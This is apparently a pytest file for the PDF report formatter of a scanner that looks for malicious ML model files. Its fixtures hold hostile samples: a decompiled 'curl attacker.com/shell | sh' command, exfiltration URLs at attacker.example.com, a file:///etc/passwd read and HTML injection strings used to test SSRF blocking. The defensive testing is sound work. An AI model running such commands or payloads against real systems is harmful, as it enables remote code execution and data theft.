"""Тесты для PdfReportFormatter.

Проверяет корректность HTML-рендеринга и (при наличии weasyprint) PDF-генерации.
Согласно CLAUDE.md: новый модуль = новый файл tests/test_MODULENAME.py.
"""

from __future__ import annotations

from datetime import datetime, timezone
from pathlib import Path

import pytest

from poison_check.core.result import (
    Confidence,
    FileResult,
    Issue,
    Reference,
    ScanResult,
    Severity,
    Summary,
)
from poison_check.output.pdf_report import PdfReportFormatter


def _weasyprint_works() -> bool:
    """Возвращает True только если weasyprint и все нативные библиотеки доступны."""
    try:
        import weasyprint  # noqa: F401

        weasyprint.CSS("body {}")
        return True
    except Exception:
        return False


_WEASYPRINT_AVAILABLE = _weasyprint_works()

# ---------------------------------------------------------------------------
# Хелперы — минимальные фикстуры
# ---------------------------------------------------------------------------


def _make_empty_result() -> ScanResult:
    """Создаёт ScanResult без issues — чистая модель."""
    return ScanResult(
        tool_version="0.1.0-test",
        timestamp=datetime(2026, 5, 1, 12, 0, 0, tzinfo=timezone.utc),
        duration_ms=42.0,
        scanned_paths=[Path("model.pt")],
        policy="default",
        results_per_file={
            Path("model.pt"): FileResult(
                file_path=Path("model.pt"),
                scanner_name="pytorch",
                issues=[],
            )
        },
        summary=Summary(),
    )


def _make_issue(
    severity: Severity = Severity.CRITICAL,
    code: str = "MLS-PKL-001",
    decompiled_code: str | None = None,
) -> Issue:
    """Создаёт тестовую Issue с заданным severity."""
    return Issue(
        code=code,
        severity=severity,
        confidence=Confidence.CERTAIN,
        message="Обнаружен вызов системной команды",
        location="model.pt:data.pkl (offset 42)",
        details={"module": "os", "function": "system"},
        why="Позволяет выполнить произвольную команду ОС при загрузке модели.",
        remediation="Не загружайте эту модель. Пересохраните в SafeTensors.",
        decompiled_code=decompiled_code,
        references=[
            Reference(type="cve", id="CVE-2025-32434"),
            Reference(type="cwe", id="CWE-502"),
        ],
        compliance_tags=["owasp-ml:ml03", "fstec:УБИ.067"],
    )


def _make_result_with_issues(
    decompiled_code: str | None = None,
) -> ScanResult:
    """Создаёт ScanResult с одной CRITICAL issue."""
    issue = _make_issue(decompiled_code=decompiled_code)
    file_result = FileResult(
        file_path=Path("malicious.pkl"),
        scanner_name="pickle",
        issues=[issue],
    )
    return ScanResult(
        tool_version="0.1.0-test",
        timestamp=datetime(2026, 5, 1, 12, 0, 0, tzinfo=timezone.utc),
        duration_ms=123.5,
        scanned_paths=[Path("malicious.pkl")],
        policy="default",
        results_per_file={Path("malicious.pkl"): file_result},
        summary=Summary(critical=1),
    )


# ---------------------------------------------------------------------------
# Тест 1: format_html() возвращает непустую строку, содержащую "<html"
# ---------------------------------------------------------------------------


def test_format_html_returns_nonempty_html_string() -> None:
    """format_html() возвращает непустую строку, начинающуюся с валидного HTML."""
    formatter = PdfReportFormatter()
    result = _make_empty_result()

    html = formatter.format_html(result)

    assert isinstance(html, str), "format_html() должен возвращать str"
    assert len(html) > 0, "format_html() не должен возвращать пустую строку"
    assert "<html" in html.lower(), "Результат должен содержать тег <html"


# ---------------------------------------------------------------------------
# Тест 2: format_html() содержит заголовок «ОТЧЁТ» на русском
# ---------------------------------------------------------------------------


def test_format_html_contains_russian_title() -> None:
    """format_html() содержит ключевое слово «ОТЧЁТ» из структуры по ГОСТ."""
    formatter = PdfReportFormatter()
    result = _make_empty_result()

    html = formatter.format_html(result)

    assert "ОТЧЁТ" in html, (
        "HTML должен содержать заголовок «ОТЧЁТ» по структуре ГОСТ (раздел 5.3)"
    )


# ---------------------------------------------------------------------------
# Тест 3: format_html() с issues содержит severity label на русском
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("severity", "expected_label"),
    [
        (Severity.CRITICAL, "КРИТИЧЕСКИЙ"),
        (Severity.HIGH, "ВЫСОКИЙ"),
        (Severity.MEDIUM, "СРЕДНИЙ"),
        (Severity.LOW, "НИЗКИЙ"),
        (Severity.INFO, "ИНФОРМАЦИОННЫЙ"),
    ],
)
def test_format_html_contains_severity_label(
    severity: Severity, expected_label: str
) -> None:
    """format_html() отображает русское название severity для каждого уровня."""
    formatter = PdfReportFormatter()

    issue = _make_issue(severity=severity)
    file_result = FileResult(
        file_path=Path("test.pkl"),
        scanner_name="pickle",
        issues=[issue],
    )
    result = ScanResult(
        tool_version="0.1.0-test",
        timestamp=datetime(2026, 5, 1, 12, 0, 0, tzinfo=timezone.utc),
        duration_ms=10.0,
        scanned_paths=[Path("test.pkl")],
        policy="default",
        results_per_file={Path("test.pkl"): file_result},
        summary=Summary(**{severity.value: 1}),
    )

    html = formatter.format_html(result)

    assert expected_label in html, (
        f"HTML должен содержать русский label '{expected_label}' для severity {severity.value}"
    )


# ---------------------------------------------------------------------------
# Тест 4: format_html() с decompiled_code содержит код в отчёте
# ---------------------------------------------------------------------------


def test_format_html_contains_decompiled_code() -> None:
    """format_html() включает декомпилированный код из issue.decompiled_code."""
    sample_code = "from posix import system\n_var0 = system('curl attacker.com/shell | sh')"
    formatter = PdfReportFormatter()
    result = _make_result_with_issues(decompiled_code=sample_code)

    html = formatter.format_html(result)

    # Jinja2 autoescape экранирует кавычки → ищем ключевые слова без спецсимволов
    assert "system" in html, "HTML должен содержать имя функции из decompiled_code"
    assert "attacker.com" in html, "HTML должен содержать URL из decompiled_code"
    assert "curl" in html, "HTML должен содержать содержимое decompiled_code"


# ---------------------------------------------------------------------------
# Тест 5: format() возвращает bytes начинающиеся с b'%PDF' (если weasyprint есть)
# ---------------------------------------------------------------------------


@pytest.mark.skipif(not _WEASYPRINT_AVAILABLE, reason="weasyprint или нативные библиотеки недоступны")
def test_format_returns_pdf_bytes() -> None:
    """format() возвращает bytes, начинающиеся с b'%PDF-' при наличии weasyprint."""

    formatter = PdfReportFormatter()
    result = _make_result_with_issues()

    pdf_bytes = formatter.format(result, client_name="ООО Ромашка", auditor_name="Иванов И.И.")

    assert isinstance(pdf_bytes, bytes), "format() должен возвращать bytes"
    assert len(pdf_bytes) > 100, "PDF не должен быть пустым"
    assert pdf_bytes[:4] == b"%PDF", (
        f"PDF должен начинаться с b'%PDF', получено: {pdf_bytes[:8]!r}"
    )


# ---------------------------------------------------------------------------
# Тест 6: format() поднимает ImportError если weasyprint не установлен
# ---------------------------------------------------------------------------


def test_format_raises_import_error_without_weasyprint(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """format() поднимает ImportError с понятным сообщением если weasyprint недоступен."""
    import importlib.util

    # Имитируем отсутствие weasyprint через monkeypatch
    original_find_spec = importlib.util.find_spec

    def mock_find_spec(name: str, *args: object, **kwargs: object) -> object:
        if name == "weasyprint":
            return None
        return original_find_spec(name, *args, **kwargs)  # type: ignore[arg-type]

    monkeypatch.setattr(importlib.util, "find_spec", mock_find_spec)

    formatter = PdfReportFormatter()
    result = _make_empty_result()

    with pytest.raises(ImportError, match="WeasyPrint"):
        formatter.format(result)


# ---------------------------------------------------------------------------
# Тест 7: format_html() корректно включает client_name и auditor_name
# ---------------------------------------------------------------------------


def test_format_html_includes_client_and_auditor_names() -> None:
    """format_html() отображает имя заказчика и аудитора на титульном листе."""
    formatter = PdfReportFormatter()
    result = _make_empty_result()

    html = formatter.format_html(
        result,
        client_name="ООО Ромашка",
        auditor_name="Иванов Иван Иванович",
    )

    assert "ООО Ромашка" in html, "HTML должен содержать имя заказчика"
    assert "Иванов Иван Иванович" in html, "HTML должен содержать имя аудитора"


# ---------------------------------------------------------------------------
# Тест 8: PDF-генератор блокирует внешние URL (SSRF defense)
# ---------------------------------------------------------------------------


class TestPdfOfflineFetcher:
    """url_fetcher блокирует HTTP/file/прочие схемы — защита от SSRF."""

    def test_offline_fetcher_rejects_http(self) -> None:
        """HTTP-URL отвергаются: вредоносный pickle мог бы вставить <img src=http://...>."""
        from poison_check.output.pdf_report import _offline_url_fetcher  # noqa: PLC0415

        with pytest.raises(OSError, match="офлайн"):
            _offline_url_fetcher("http://attacker.example.com/exfil")

    def test_offline_fetcher_rejects_https(self) -> None:
        """HTTPS-URL тоже отвергаются."""
        from poison_check.output.pdf_report import _offline_url_fetcher  # noqa: PLC0415

        with pytest.raises(OSError, match="офлайн"):
            _offline_url_fetcher("https://example.com/img.png")

    def test_offline_fetcher_rejects_file_scheme(self) -> None:
        """file://-URI отвергаются: иначе можно прочитать /etc/passwd через PDF."""
        from poison_check.output.pdf_report import _offline_url_fetcher  # noqa: PLC0415

        with pytest.raises(OSError, match="офлайн"):
            _offline_url_fetcher("file:///etc/passwd")

    def test_offline_fetcher_rejects_javascript(self) -> None:
        """javascript:-URI отвергается."""
        from poison_check.output.pdf_report import _offline_url_fetcher  # noqa: PLC0415

        with pytest.raises(OSError, match="офлайн"):
            _offline_url_fetcher("javascript:alert(1)")

    def test_offline_fetcher_rejects_ftp(self) -> None:
        """ftp:// отвергается."""
        from poison_check.output.pdf_report import _offline_url_fetcher  # noqa: PLC0415

        with pytest.raises(OSError, match="офлайн"):
            _offline_url_fetcher("ftp://attacker.example/payload")

    def test_pdf_generation_with_malicious_url_in_issue_does_not_fetch(self) -> None:
        """End-to-end: вредоносный URL в Issue.message → PDF не делает GET-запрос.

        Регрессия аудита #16: Issue.message со встроенным <img src="http://attacker">
        должен пройти автоэкранирование Jinja2 и НЕ вызвать сетевой запрос даже
        если экранирование пропустит. Проверяется, что url_fetcher не вызывает
        сеть — мы либо получаем PDF (URL экранирован), либо OSError с 'офлайн'.
        """
        if not _WEASYPRINT_AVAILABLE:
            pytest.skip("weasyprint или нативные библиотеки недоступны")

        # Issue с вредоносным URL во всех полях, которые попадают в шаблон
        evil_issue = Issue(
            code="MLS-EVIL-001",
            severity=Severity.CRITICAL,
            confidence=Confidence.HIGH,
            message='<img src="http://attacker.example.com/leak">payload',
            location="evil.pkl",
            details={"url": "http://attacker.example.com/leak"},
            why='Decompiled: <a href="http://attacker.example.com">click</a>',
            decompiled_code='# <img src="http://attacker.example.com/exfil">',
        )
        result = ScanResult(
            tool_version="0.1.0-test",
            timestamp=datetime(2026, 5, 1, 12, 0, 0, tzinfo=timezone.utc),
            duration_ms=10.0,
            scanned_paths=[Path("evil.pkl")],
            policy="default",
            results_per_file={
                Path("evil.pkl"): FileResult(
                    file_path=Path("evil.pkl"),
                    scanner_name="pickle",
                    issues=[evil_issue],
                )
            },
            summary=Summary(critical=1),
        )

        formatter = PdfReportFormatter()
        # Должно либо отдать PDF (если Jinja2 экранировал), либо упасть с
        # OSError про офлайн-режим (если экранирование не сработало) — в
        # любом случае реальный сетевой запрос не происходит.
        try:
            pdf_bytes = formatter.format(result)
            assert pdf_bytes.startswith(b"%PDF-"), "Должен вернуться PDF-документ"
        except (OSError, RuntimeError) as exc:
            # RuntimeError оборачивает OSError из url_fetcher
            msg = str(exc)
            assert "офлайн" in msg or "Сетевые ресурсы запрещены" in msg, (
                f"Неожиданная ошибка: {exc!r}"
            )
